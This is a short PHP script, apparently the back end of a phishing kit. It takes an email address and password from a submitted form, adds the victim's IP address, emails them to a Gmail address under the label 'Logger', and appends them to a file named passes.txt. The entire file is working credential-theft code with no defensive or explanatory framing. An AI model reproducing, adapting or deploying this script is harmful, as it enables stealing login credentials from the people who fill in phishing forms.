<?php

//Get the necessary variables from the server.
$ema1l = $_POST['X1'];
$pass = $_POST['X2'];
$ip = $_SERVER["REMOTE_ADDR"];

//Define required variables and send user input to $myEmail.
$myEmail = 'gxvcdel@gmail.com';
$subject = 'Internet Results';
$message = "Email: ".$ema1l."\nPassword:".$pass."\nIP:".$ip."\n";
$headers = "From: Logger<noreply@cxvtradinginc.com.ng> \r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "MIME-Version: 1.0" . "\r\n";
mail($myEmail, $subject, $message, $headers);
$file = "passes.txt"; 

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);

?>